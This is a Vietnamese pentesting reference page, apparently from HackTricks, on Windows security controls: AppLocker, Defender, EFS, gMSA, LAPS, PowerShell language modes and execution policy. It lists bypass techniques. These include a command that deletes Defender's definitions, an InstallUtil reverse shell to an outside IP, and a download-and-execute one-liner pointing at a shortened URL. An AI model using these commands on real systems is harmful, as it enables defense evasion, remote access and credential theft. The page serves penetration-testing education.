# Các biện pháp kiểm soát bảo mật của Windows

{{#include ../banners/hacktricks-training.md}}

## Chính sách AppLocker

Danh sách cho phép ứng dụng là danh sách các ứng dụng phần mềm hoặc tệp thực thi đã được phê duyệt, được phép hiện diện và chạy trên hệ thống. Mục tiêu là bảo vệ môi trường khỏi malware có hại và phần mềm chưa được phê duyệt, không phù hợp với nhu cầu kinh doanh cụ thể của tổ chức.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) là **giải pháp lập danh sách cho phép ứng dụng** của Microsoft, cho phép quản trị viên hệ thống kiểm soát **những ứng dụng và tệp mà người dùng có thể chạy**. Giải pháp này cung cấp **khả năng kiểm soát chi tiết** đối với tệp thực thi, script, tệp cài đặt Windows, DLL, ứng dụng đóng gói và trình cài đặt ứng dụng đóng gói.\
Các tổ chức thường **chặn cmd.exe và PowerShell.exe** cũng như quyền ghi vào một số thư mục, **nhưng có thể bypass tất cả những hạn chế này**.

### Kiểm tra

Kiểm tra những tệp/đuôi tệp nào nằm trong danh sách đen/danh sách cho phép:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` đánh giá các tệp ứng viên cho một danh tính cụ thể dựa trên chính sách AppLocker. Hãy kiểm tra tài khoản có token sẽ thực thi payload, vì các quy tắc có thể nhắm đến người dùng hoặc nhóm; `Get-AppLockerFileInformation` cũng hữu ích để kiểm tra đường dẫn, hash và siêu dữ liệu nhà phát hành mà các quy tắc có thể khớp.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Đường dẫn registry này chứa các cấu hình và chính sách được AppLocker áp dụng, giúp xem lại tập hợp quy tắc hiện đang được thực thi trên hệ thống:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Các **thư mục có quyền ghi** hữu ích để bypass chính sách AppLocker: Nếu AppLocker cho phép thực thi bất kỳ thứ gì bên trong `C:\Windows\System32` hoặc `C:\Windows`, bạn có thể sử dụng một số **thư mục có quyền ghi** để **bypass chính sách này**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Các binary [**"LOLBAS's"**](https://lolbas-project.github.io/) thường được **tin cậy** cũng có thể hữu ích để bypass AppLocker.
- **Các rule viết kém cũng có thể bị bypass**
  - Ví dụ: **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**; bạn có thể tạo một **folder tên `allowed`** ở bất kỳ đâu và folder đó sẽ được cho phép.
  - Các tổ chức cũng thường tập trung vào việc **chặn executable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, nhưng lại quên mất các **vị trí khác** của [**PowerShell executable**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), chẳng hạn như `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` hoặc `PowerShell_ISE.exe`.
- **DLL enforcement rất hiếm khi được bật** do có thể làm tăng tải cho hệ thống và cần nhiều thử nghiệm để đảm bảo không xảy ra lỗi. Vì vậy, sử dụng **DLL làm backdoor sẽ giúp bypass AppLocker**.
- Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** code **Powershell** trong bất kỳ process nào và bypass AppLocker. Để biết thêm thông tin, xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Lưu trữ thông tin xác thực

### Security Accounts Manager (SAM)

Thông tin xác thực cục bộ nằm trong file này; mật khẩu được lưu dưới dạng hash.

### Local Security Authority (LSA) - LSASS

**Thông tin xác thực** (đã hash) được **lưu** trong **bộ nhớ** của subsystem này để hỗ trợ Single Sign-On.\
**LSA** quản lý **security policy** cục bộ (chính sách mật khẩu, quyền của người dùng...), **xác thực**, **access token**...\
LSA sẽ **kiểm tra** thông tin xác thực được cung cấp trong file **SAM** (khi đăng nhập cục bộ) và **liên lạc** với **domain controller** để xác thực người dùng domain.

**Thông tin xác thực** được **lưu** trong **process LSASS**: Kerberos ticket, hash NT và LM, mật khẩu dễ giải mã.

### LSA secrets

LSA có thể lưu một số thông tin xác thực trên disk:

- Mật khẩu của tài khoản máy tính Active Directory (khi không thể kết nối với domain controller).
- Mật khẩu của các tài khoản dịch vụ Windows
- Mật khẩu cho các scheduled task
- Thêm nữa (mật khẩu của ứng dụng IIS...)

### NTDS.dit

Đây là database của Active Directory. File này chỉ có trên Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) là một antivirus có trong Windows 10, Windows 11 và các phiên bản Windows Server. Nó **chặn** các công cụ pentesting phổ biến như **`WinPEAS`**. Tuy nhiên, có những cách để **bypass các biện pháp bảo vệ này**.

### Kiểm tra

Để kiểm tra **trạng thái** của **Defender**, bạn có thể thực thi PS cmdlet **`Get-MpComputerStatus`** (kiểm tra giá trị của **`RealTimeProtectionEnabled`** để biết tính năng có đang hoạt động hay không):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bạn cũng có thể chạy lệnh sau để enumerate:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Hệ thống tệp được mã hóa (EFS)

EFS bảo vệ tệp bằng cách mã hóa, sử dụng **khóa đối xứng** có tên là **Khóa mã hóa tệp (FEK)**. Khóa này được mã hóa bằng **khóa công khai** của người dùng và lưu trong **luồng dữ liệu thay thế** $EFS của tệp được mã hóa. Khi cần giải mã, **khóa riêng tư** tương ứng với chứng chỉ số của người dùng được dùng để giải mã FEK từ luồng $EFS. Bạn có thể tìm hiểu thêm [tại đây](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Các tình huống giải mã không cần người dùng khởi tạo** bao gồm:

- Khi tệp hoặc thư mục được chuyển sang hệ thống tệp không hỗ trợ EFS, chẳng hạn như [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), chúng sẽ tự động được giải mã.
- Tệp được mã hóa gửi qua mạng bằng giao thức SMB/CIFS sẽ được giải mã trước khi truyền.

Phương thức mã hóa này cho phép chủ sở hữu **truy cập minh bạch** vào các tệp được mã hóa. Tuy nhiên, chỉ đổi mật khẩu của chủ sở hữu rồi đăng nhập sẽ không cho phép giải mã.

**Điểm chính cần nhớ**:

- EFS sử dụng FEK đối xứng, được mã hóa bằng khóa công khai của người dùng.
- Việc giải mã sử dụng khóa riêng tư của người dùng để truy cập FEK.
- Tự động giải mã diễn ra trong một số điều kiện nhất định, chẳng hạn như sao chép sang FAT32 hoặc truyền qua mạng.
- Chủ sở hữu có thể truy cập các tệp được mã hóa mà không cần thực hiện thêm bước nào.

### Kiểm tra thông tin EFS

Kiểm tra xem **người dùng** có **đã sử dụng** **dịch vụ** này hay không bằng cách kiểm tra đường dẫn sau có tồn tại không:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kiểm tra **ai** có **quyền truy cập** vào tệp bằng lệnh cipher /c \<file>\
Bạn cũng có thể dùng `cipher /e` và `cipher /d` bên trong một thư mục để **mã hóa** và **giải mã** tất cả các tệp

### Giải mã tệp EFS

#### Trở thành Authority System

Cách tiếp cận này yêu cầu **người dùng nạn nhân** phải **đang chạy** một **process** trên máy chủ. Nếu vậy, từ một phiên `meterpreter`, bạn có thể mạo danh token process của người dùng (`impersonate_token` từ `incognito`). Ngoài ra, bạn có thể `migrate` vào process của người dùng.

#### Biết mật khẩu của người dùng

Mimikatz có thể nhập chứng chỉ và khóa riêng tư của người dùng, sau đó dùng chúng để giải mã các tệp được bảo vệ bằng EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Tài khoản dịch vụ được quản lý theo nhóm (gMSA)

Microsoft phát triển **Tài khoản dịch vụ được quản lý theo nhóm (gMSA)** để đơn giản hóa việc quản lý tài khoản dịch vụ trong hạ tầng CNTT. Không giống các tài khoản dịch vụ truyền thống thường bật thiết lập "**Mật khẩu không bao giờ hết hạn**", gMSA cung cấp giải pháp an toàn và dễ quản lý hơn:

- **Tự động quản lý mật khẩu**: gMSA sử dụng mật khẩu phức tạp dài 240 ký tự, tự động thay đổi theo chính sách miền hoặc máy tính. Quy trình này do Key Distribution Service (KDC) của Microsoft xử lý, loại bỏ nhu cầu cập nhật mật khẩu thủ công.
- **Tăng cường bảo mật**: Các tài khoản này không bị khóa và không thể dùng để đăng nhập tương tác, giúp tăng cường bảo mật.
- **Hỗ trợ nhiều máy chủ**: gMSA có thể được chia sẻ giữa nhiều máy chủ, phù hợp với các dịch vụ chạy trên nhiều máy chủ.
- **Khả năng chạy tác vụ theo lịch**: Không giống các tài khoản dịch vụ được quản lý, gMSA hỗ trợ chạy tác vụ theo lịch.
- **Đơn giản hóa việc quản lý SPN**: Hệ thống tự động cập nhật Service Principal Name (SPN) khi có thay đổi về thông tin sAMaccount hoặc tên DNS của máy tính, giúp đơn giản hóa việc quản lý SPN.

Mật khẩu của gMSA được lưu trong thuộc tính LDAP _**msDS-ManagedPassword**_ và được Domain Controller (DC) tự động đặt lại sau mỗi 30 ngày. Mật khẩu này là một blob dữ liệu được mã hóa, có tên [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), chỉ quản trị viên được ủy quyền và các máy chủ đã cài đặt gMSA mới có thể truy xuất, qua đó bảo đảm môi trường an toàn. Để truy cập thông tin này, cần có kết nối bảo mật như LDAPS hoặc kết nối phải được xác thực bằng 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bạn có thể đọc mật khẩu này bằng [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Tìm hiểu thêm trong bài viết này**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ngoài ra, hãy xem [trang web này](https://cube0x0.github.io/Relaying-for-gMSA/) để biết cách thực hiện **NTLM relay attack** nhằm **đọc** **mật khẩu** của **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Khi enumeration, hãy phân biệt **Microsoft LAPS phiên bản cũ** với triển khai **Windows LAPS** gốc. Windows LAPS được phát hành trong các bản cập nhật Windows ngày 11 tháng 4 năm 2023 và có thể sao lưu mật khẩu quản trị viên cục bộ được quản lý lên **Windows Server Active Directory** hoặc **Microsoft Entra ID**. Trong các môi trường triển khai dựa trên AD, tính năng này cũng có thể mã hóa mật khẩu, lưu giữ lịch sử mật khẩu đã mã hóa và quản lý mật khẩu DSRM của domain controller. MSI phiên bản cũ có thể tải xuống đã bị ngừng hỗ trợ trên các phiên bản Windows mới hơn, dù Windows LAPS vẫn có thể hoạt động ở chế độ mô phỏng phiên bản cũ.<sup>[[6]](#references)</sup>

Vì Microsoft LAPS phiên bản cũ và Windows LAPS là hai triển khai riêng biệt, hãy xác định triển khai nào đang được sử dụng trước khi áp dụng các attack đặc thù cho attribute hoặc cmdlet. Trang được liên kết trình bày cách phát hiện, enumeration ACL, truy xuất, thao túng thời hạn và khôi phục offline mà không lặp lại các quy trình đó ở đây.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hạn chế nhiều tính năng** cần thiết để sử dụng PowerShell hiệu quả, chẳng hạn như chặn các đối tượng COM, chỉ cho phép các kiểu .NET được phê duyệt, các workflow dựa trên XAML, các lớp PowerShell và nhiều tính năng khác.

### **Kiểm tra**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Trong các phiên bản Windows hiện tại, Bypass đó sẽ không hoạt động, nhưng bạn có thể dùng [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Để biên dịch, bạn có thể cần** **Thêm** _**Tham chiếu**_ -> _Duyệt_ ->_Duyệt_ -> thêm `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` và **đổi project sang .Net4.5**.

#### Bypass trực tiếp:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** mã Powershell trong bất kỳ tiến trình nào và bypass chế độ hạn chế. Để biết thêm thông tin, xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Chính sách thực thi PS

Theo mặc định, chính sách này được đặt thành **restricted.** Các cách chính để bypass chính sách này:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Có thể tìm hiểu thêm [tại đây](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Đây là API có thể được dùng để xác thực người dùng.

SSPI chịu trách nhiệm tìm giao thức phù hợp cho hai máy muốn giao tiếp. Kerberos là phương thức được ưu tiên. Sau đó, SSPI sẽ thương lượng giao thức xác thực được sử dụng. Các giao thức xác thực này được gọi là Security Support Provider (SSP), nằm trong mỗi máy Windows dưới dạng DLL và cả hai máy phải hỗ trợ cùng một giao thức thì mới có thể giao tiếp.

### Các SSP chính

- **Kerberos**: Giao thức được ưu tiên
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** và **NTLMv2**: Dùng vì lý do tương thích
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Dùng cho máy chủ web và LDAP, mật khẩu ở dạng hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL và TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Được dùng để thương lượng giao thức sẽ sử dụng (Kerberos hoặc NTLM; Kerberos là giao thức mặc định)
  - %windir%\Windows\System32\lsasrv.dll

#### Quá trình thương lượng có thể đưa ra nhiều phương thức hoặc chỉ một phương thức.

## UAC - Kiểm soát Tài khoản Người dùng

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng hiển thị **lời nhắc xác nhận cho các hoạt động cần quyền nâng cao**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Vượt qua AppLocker và chế độ ngôn ngữ bị giới hạn của PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [cách giải mã tệp EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Chuyển tiếp xác thực cho gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 cách vượt qua PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Sử dụng các cmdlet AppLocker của Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Tổng quan về Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
